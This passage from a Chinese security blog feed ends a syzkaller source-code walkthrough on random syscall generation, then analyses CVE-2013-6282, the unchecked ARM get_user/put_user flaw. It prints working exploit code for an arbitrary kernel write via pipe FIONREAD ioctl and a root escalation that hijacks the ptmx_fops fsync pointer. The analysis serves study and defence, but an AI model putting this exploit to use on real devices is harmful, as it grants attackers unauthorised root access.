class="number">11</span>):</span><br><span class="line">v = r.rand(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">v = r.randInt()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IntRange:</span><br><span class="line">v = r.randRangeInt(a.RangeBegin, a.RangeEnd)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> MakeConstArg(a, v), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> *ProcType:</span><br><span class="line"><span class="comment">//proc类型的参数</span></span><br><span class="line"><span class="keyword">return</span> MakeConstArg(a, r.rand(<span class="keyword">int</span>(a.ValuesPerProc))), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> *ArrayType:</span><br><span class="line"><span class="comment">//arrary数组类型的参数</span></span><br><span class="line"><span class="keyword">var</span> count <span class="keyword">uint64</span></span><br><span class="line"><span class="keyword">switch</span> a.Kind &#123;</span><br><span class="line"><span class="keyword">case</span> ArrayRandLen:</span><br><span class="line">count = r.randArrayLen()</span><br><span class="line"><span class="keyword">case</span> ArrayRangeLen:</span><br><span class="line">count = r.randRange(a.RangeBegin, a.RangeEnd)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> inner []Arg</span><br><span class="line"><span class="keyword">var</span> calls []*Call</span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">uint64</span>(<span class="number">0</span>); i &lt; count; i++ &#123;</span><br><span class="line">arg1, calls1 := r.generateArg(s, a.Type)</span><br><span class="line">inner = <span class="built_in">append</span>(inner, arg1)</span><br><span class="line">calls = <span class="built_in">append</span>(calls, calls1...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> MakeGroupArg(a, inner), calls</span><br><span class="line"><span class="keyword">case</span> *StructType:</span><br><span class="line"><span class="comment">//struct结构体类型的参数</span></span><br><span class="line"><span class="keyword">if</span> !ignoreSpecial &#123;</span><br><span class="line"><span class="keyword">if</span> gen := r.target.SpecialTypes[a.Name()]; gen != <span class="literal">nil</span> &amp;&amp; a.Dir() != DirOut &#123;<span class="comment">//非输出参数</span></span><br><span class="line"><span class="comment">//生成结构体类型值</span></span><br><span class="line">arg, calls = gen(&amp;Gen&#123;r, s&#125;, a, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">args, calls := r.generateArgs(s, a.Fields)</span><br><span class="line">group := MakeGroupArg(a, args)</span><br><span class="line"><span class="keyword">return</span> group, calls</span><br><span class="line"><span class="keyword">case</span> *UnionType:</span><br><span class="line"><span class="comment">//联合union类型</span></span><br><span class="line"><span class="keyword">if</span> !ignoreSpecial &#123;</span><br><span class="line"><span class="keyword">if</span> gen := r.target.SpecialTypes[a.Name()]; gen != <span class="literal">nil</span> &amp;&amp; a.Dir() != DirOut &#123;</span><br><span class="line">arg, calls = gen(&amp;Gen&#123;r, s&#125;, a, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">optType := a.Fields[r.Intn(<span class="built_in">len</span>(a.Fields))]</span><br><span class="line">opt, calls := r.generateArg(s, optType)</span><br><span class="line"><span class="keyword">return</span> MakeUnionArg(a, opt), calls</span><br><span class="line"><span class="keyword">case</span> *PtrType:</span><br><span class="line"><span class="comment">//指针类型</span></span><br><span class="line">inner, calls := r.generateArg(s, a.Type)</span><br><span class="line"><span class="comment">// TODO(dvyukov): remove knowledge about iocb from prog.</span></span><br><span class="line"><span class="keyword">if</span> a.Type.Name() == <span class="string">"iocb"</span> &amp;&amp; <span class="built_in">len</span>(s.resources[<span class="string">"iocbptr"</span>]) != <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// It is weird, but these are actually identified by kernel by address.</span></span><br><span class="line"><span class="comment">// So try to reuse a previously used address.</span></span><br><span class="line">addrs := s.resources[<span class="string">"iocbptr"</span>]</span><br><span class="line">addr := addrs[r.Intn(<span class="built_in">len</span>(addrs))].(*PointerArg)</span><br><span class="line">arg = MakePointerArg(a, addr.Address, inner)</span><br><span class="line"><span class="keyword">return</span> arg, calls</span><br><span class="line">&#125;</span><br><span class="line">arg := r.allocAddr(s, a, inner.Size(), inner)</span><br><span class="line"><span class="keyword">return</span> arg, calls</span><br><span class="line"><span class="keyword">case</span> *LenType:</span><br><span class="line"><span class="comment">//len长度类型的参数</span></span><br><span class="line"><span class="comment">// Return placeholder value of 0 while generating len arg.</span></span><br><span class="line"><span class="keyword">return</span> MakeConstArg(a, <span class="number">0</span>), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> *CsumType:</span><br><span class="line"><span class="comment">//csum类型的参数</span></span><br><span class="line"><span class="keyword">return</span> MakeConstArg(a, <span class="number">0</span>), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"unknown argument type"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="随机生成系统调用总结"><a href="#随机生成系统调用总结" class="headerlink" title="随机生成系统调用总结"></a>随机生成系统调用总结</h3><p>syzkaller使用两种方法来进行fuzz,基于生成和基于变异,本文是介绍基于生成fuzz相关的类型和核心处理函数<br>由于随机类型randGen包含了目标体系结构描述Target,而目标体系结构描述包含系统调用等信息,所以可以通过<br>随机类型随机生成目标系统中任意一个系统调用并给其参数生成一些值(按不同参数类型生成特定类型的值,这就是为什么定义系统调用描述时区分了系统调用参数类型数组和参数值数组见Call类型)<br>这里和fuzz相关的一个类型是Prog,Prog类型包含了Target类型——目标系统相关的信息以及系统调用Call切片数组,<br>通过随机类型生成一个Prog类型(包含了随机生成的一组系统调用及其其参数),然后去执行Prog类型生成的一组系统调用,进而实现fuzz</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;syzkaller源码阅读之生成系统调用&quot;&gt;&lt;a href=&quot;#syzkaller源码阅读之生成系统调用&quot; class=&quot;headerlink&quot; title=&quot;syzkaller源码阅读之生成系统调用&quot;&gt;&lt;/a&gt;syzkaller源码阅读之生成系统调用&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="syzkaller" scheme="https://0x9k.club/tags/syzkaller/"/>
    
      <category term="fuzzer" scheme="https://0x9k.club/tags/fuzzer/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2013-6282-analysis</title>
    <link href="https://0x9k.club/posts/kernel/2018-05-02-cve_2013_6282_analysis.html"/>
    <id>https://0x9k.club/posts/kernel/2018-05-02-cve_2013_6282_analysis.html</id>
    <published>2018-05-02T15:39:39.000Z</published>
    <updated>2018-05-02T15:39:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="本文摘要——"><a href="#本文摘要——" class="headerlink" title=" 本文摘要——   "></a><strong> 本文摘要—— CVE-2013-6282-analysis </strong> <excerpt in="" index="" |="" 首页:摘要=""></excerpt></h1><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="CVE-2013-6282分析-相关系统调用查询"><a href="#CVE-2013-6282分析-相关系统调用查询" class="headerlink" title="CVE-2013-6282分析(相关系统调用查询)"></a>CVE-2013-6282分析(<a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">相关系统调用查询</a>)</h2><h3 id="用户空间和内核空间传递数据"><a href="#用户空间和内核空间传递数据" class="headerlink" title="用户空间和内核空间传递数据"></a>用户空间和内核空间传递数据</h3><p>用户空间和内核空间传递数据一般是通过copy_to_user/copy_from_user或者put_user/get_user</p><h4 id="put-user-linux-include-asm-i386-uaccess-h"><a href="#put-user-linux-include-asm-i386-uaccess-h" class="headerlink" title="put_user(linux/include/asm-i386/uaccess.h)"></a>put_user(linux/include/asm-i386/uaccess.h)</h4><p>put_user向用户空间ptr写入一个简单的值x</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">put_user(x,ptr)</span><br><span class="line">ptr——用户空间的目的地址</span><br><span class="line">x——写入用户空间的值</span><br><span class="line">返回<span class="number">0</span>表示成功,-EFAULT表示失败</span><br></pre></td></tr></table></figure><h4 id="get-user"><a href="#get-user" class="headerlink" title="get_user"></a>get_user</h4><p>get_user从用户空间获取一个简单的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get_user(x,ptr)</span><br><span class="line">ptr——用户空间的源地址</span><br><span class="line">x——用来存储结果的变量</span><br><span class="line">返回<span class="number">0</span>表示成功,-EFAULT表示失败</span><br></pre></td></tr></table></figure><h4 id="copy-to-user"><a href="#copy-to-user" class="headerlink" title="copy_to_user"></a>copy_to_user</h4><p>copy_to_user拷贝一块数据到用户空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">copy_to_user</span> <span class="params">(<span class="keyword">void</span> __user * to, <span class="keyword">const</span> <span class="keyword">void</span> * from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span></span>;</span><br><span class="line">to——用户空间的目的地址</span><br><span class="line">from——内核空间的源地址</span><br><span class="line">n——拷贝的字节数</span><br></pre></td></tr></table></figure><h4 id="copy-from-user"><a href="#copy-from-user" class="headerlink" title="copy_from_user"></a>copy_from_user</h4><p>copy_from_user从用户空间拷贝一块数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">copy_from_user</span> <span class="params">(<span class="keyword">void</span> * to, <span class="keyword">const</span> <span class="keyword">void</span> __user * from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span></span>;</span><br><span class="line">to——内核空间的目的地址</span><br><span class="line">from——用户空间的源地址</span><br><span class="line">n——拷贝的字节数</span><br></pre></td></tr></table></figure><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>linux3.5.5之前的内核对ARM平台上的get_user和put_user函数没有进行地址的检查,导致内核任意地址读写,导致LPE(本地权限提升)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The (<span class="number">1</span>) get_user and (<span class="number">2</span>) put_user API functions in </span><br><span class="line">the Linux kernel before <span class="number">3.5</span><span class="number">.5</span> on the v6k and v7 ARM platforms </span><br><span class="line">do not validate certain addresses, which allows attackers to </span><br><span class="line">read or modify the contents of arbitrary kernel memory locations </span><br><span class="line">via a crafted application, as exploited in the wild against </span><br><span class="line">Android devices in October and November <span class="number">2013.</span></span><br></pre></td></tr></table></figure><h4 id="通过put-user达到任意地址写-也可以通过ptrace调用put-user实现任意地址写"><a href="#通过put-user达到任意地址写-也可以通过ptrace调用put-user实现任意地址写" class="headerlink" title="通过put_user达到任意地址写(也可以通过ptrace调用put_user实现任意地址写)"></a>通过put_user达到任意地址写(也可以通过ptrace调用put_user实现任意地址写)</h4><p>通过put_user达到任意地址写的思路——使用pipe(pipe会调用到put_user)<br>1、建立一个管道<br>2、向建立好的管道写入count个字节<br>3、通过管道的ioctl调用put_user向指定的地址写count<br>4、重复4次步骤2即可实现向任意地址写任意4字节</p><p><a href="https://elixir.bootlin.com/linux/v2.6.35/source/fs/pipe.c#L654" target="_blank" rel="noopener">实现任意地址写</a><br>address——写入的地址<br>value——写入的值</p><p>把要写入的值如:0x12345678封装成一个char data[4]四字节的数组,分4次写入对应的地址<br><em>(int </em>)&amp;data = value;<br>向管道写入data[i]个字节(0x12个字节、0x34个字节、0x56个字节、0x78个字节)<br>write(pfd[1], buf, data[i])<br>通过pipe的FIONREAD调用put_user实现任意地址写<br>ioctl(pfd[0], FIONREAD, (void *)(address + i)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/fs/pipe.c#L654</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">pipe_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">filp</span>-&gt;<span class="title">f_path</span>.<span class="title">dentry</span>-&gt;<span class="title">d_inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="keyword">int</span> count, buf, nrbufs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FIONREAD:</span><br><span class="line">mutex_lock(&amp;inode-&gt;i_mutex);</span><br><span class="line">pipe = inode-&gt;i_pipe;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">buf = pipe-&gt;curbuf;</span><br><span class="line">nrbufs = pipe-&gt;nrbufs;</span><br><span class="line"><span class="keyword">while</span> (--nrbufs &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//可以发现count是pipe管道中写入的字节数</span></span><br><span class="line">count += pipe-&gt;bufs[buf].len;</span><br><span class="line">buf = (buf+<span class="number">1</span>) &amp; (pipe-&gt;buffers - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">mutex_unlock(&amp;inode-&gt;i_mutex);</span><br><span class="line">            <span class="comment">//由于参数arg是可控的且put_user没有进行地址的检查,这里控制为任意地址</span></span><br><span class="line">            <span class="comment">//count为管道pipe中写入的字节数</span></span><br><span class="line"><span class="keyword">return</span> put_user(count, (<span class="keyword">int</span> __user *)arg);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="任意地址写exp"><a href="#任意地址写exp" class="headerlink" title="任意地址写exp"></a><a href="https://github.com/fi01/libput_user_exploit/blob/master/put_user.c" target="_blank" rel="noopener">任意地址写exp</a></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">pipe_write_value_at_address</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> pfd[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;data = value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pipe(pfd) == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">"pipe"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//循环4次向address地址写入value</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> (data); i++) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (data[i]) &#123;</span><br><span class="line">      <span class="comment">//向管道写入data[i]个字节此时count=data[i]</span></span><br><span class="line">      <span class="keyword">if</span> (write(pfd[<span class="number">1</span>], buf, data[i]) != data[i]) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"error in write().\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用pipe_ioctl的FIONREAD——put_user实现任意地址写</span></span><br><span class="line">    <span class="comment">//地址address+i写入一个字节,值为data[i]</span></span><br><span class="line">    <span class="comment">//循环四次</span></span><br><span class="line">    <span class="keyword">if</span> (ioctl(pfd[<span class="number">0</span>], FIONREAD, (<span class="keyword">void</span> *)(address + i)) == <span class="number">-1</span>) &#123;</span><br><span class="line">      perror(<span class="string">"ioctl"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data[i]) &#123;</span><br><span class="line">      <span class="comment">//判断任意地址写是否成功</span></span><br><span class="line">      <span class="keyword">if</span> (read(pfd[<span class="number">0</span>], buf, <span class="keyword">sizeof</span> buf) != data[i]) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error in read().\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  close(pfd[<span class="number">0</span>]);<span class="comment">//read</span></span><br><span class="line">  close(pfd[<span class="number">1</span>]);<span class="comment">//write</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> i == <span class="keyword">sizeof</span> (data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="任意地址写的利用思路"><a href="#任意地址写的利用思路" class="headerlink" title="任意地址写的利用思路"></a><a href="https://github.com/timwr/CVE-2013-6282/blob/master/exploit.c" target="_blank" rel="noopener">任意地址写的利用思路</a></h4><p>利用思路:<br>1、获取ptmx_fops地址<br>2、计算得到ptmx_fops_fsync地址<br>3、用0xXXXXXXXX替换ptmx_fops_fsync即替换ptmx_fops-&gt;fsync指针<br>4、在0xXXXXXXXX为函数地址(实现commit_creds(prepare_kernel_cred(0))),0xXXXXXXXX也可以是提前部署好的shellcode<br>5、触发fsync调用(open(/dev/ptmx)触发)</p><p>打开一个terminal,会在devpts文件系统/dev/pts下创建一个对应的pts字符文件,<br>该pts字符文件节点直接由/dev/ptmx节点的驱动函数ptmx_open()<br>ptmx是一个file_operations只要找到ptmx的位置修改对应文件指针fsync即可截获控制流</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">利用</span><br><span class="line">ptmx_fops_fsync_address = ptmx_fops_address + <span class="number">0x38</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改ptmx_fops-&gt;fsync指针为obtain_root_privilege</span></span><br><span class="line">overwrite_ptmx_fsync_address(ptmx_fops_fsync_address, &amp;obtain_root_privilege, run_obtain_root_privilege, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">bool overwrite_ptmx_fsync_address(unsigned long int address, void *value, bool (*exploit_callback)(void *user_data), void *user_data) &#123;</span><br><span class="line"><span class="keyword">bool</span> success;</span><br><span class="line"><span class="comment">/*ptrace_write_value_at_address(address, value);*/</span></span><br><span class="line">pipe_write_value_at_address(address, value);</span><br><span class="line"><span class="comment">//exploit_callback触发open("/dev/ptmx") fsync调用</span></span><br><span class="line">success = exploit_callback(user_data);</span><br><span class="line"><span class="keyword">return</span> success;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提取</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">obtain_root_privilege</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发fsync调用调用</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">run_obtain_root_privilege</span><span class="params">(<span class="keyword">void</span> *user_data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(PTMX_DEVICE, O_WRONLY);<span class="comment">//"/dev/ptmx"</span></span><br><span class="line">fsync(fd);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ptmx-fops定义"><a href="#ptmx-fops定义" class="headerlink" title="ptmx_fops定义"></a><a href="https://elixir.bootlin.com/linux/v2.6.35/source/drivers/char/pty.c#L680" target="_blank" rel="noopener">ptmx_fops定义</a></h5><p>ptmx_fops定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ptmx_fops</span>;</span></span><br></pre></td></tr></table></figure><p>file_operations定义(可以看出fsync在ptmx中的偏移)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">从file_operations定义中可以看到fsync偏移是多少</span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/fs.h#L1485</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment"> * read, write, poll, fsync, readv, writev, unlocked_ioctl and compat_ioctl</span></span><br><span class="line"><span class="comment"> * can be called without the big kernel lock held in all filesystems.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*aio_read) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line"><span class="keyword">ssize_t</span> (*aio_write) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*readdir) (struct file *, <span class="keyword">void</span> *, <span class="keyword">filldir_t</span>);</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">int</span> <span class="params">(*poll)</span> <span class="params">(struct file *, struct poll_table_struct *)</span></span>;</span><br><span class="line"><span class="keyword">int</span> (*ioctl) (struct inode *, struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line"><span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line"><span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line"><span class="keyword">int</span> (*release) (struct inode *, struct file *);</span><br><span class="line"><span class="keyword">int</span> (*fsync) (struct file *, <span class="keyword">int</span> datasync);<span class="comment">//haijack函数指针</span></span><br><span class="line"><span class="keyword">int</span> (*aio_fsync) (struct kiocb *, <span class="keyword">int</span> datasync);</span><br><span class="line"><span class="keyword">int</span> (*fasync) (<span class="keyword">int</span>, struct file *, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*lock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*sendpage) (struct file *, struct page *, <span class="keyword">int</span>, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line"><span class="keyword">int</span> (*check_flags)(<span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*flock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*splice_write)(struct pipe_inode_info *, struct file *, <span class="keyword">loff_t</span> *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">ssize_t</span> (*splice_read)(struct file *, <span class="keyword">loff_t</span> *, struct pipe_inode_info *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*setlease)(struct file *, <span class="keyword">long</span>, struct file_lock **);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://elixir.bootlin.com/linux/v2.6.35/source/fs/sync.c#L208" target="_blank" rel="noopener">fsync系统调用</a></p><p>fsync===&gt;do_fsync===&gt;vfs_fsync===&gt;vfs_fsync_range===&gt;file-&gt;f_op-&gt;fsync(截获控制流)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 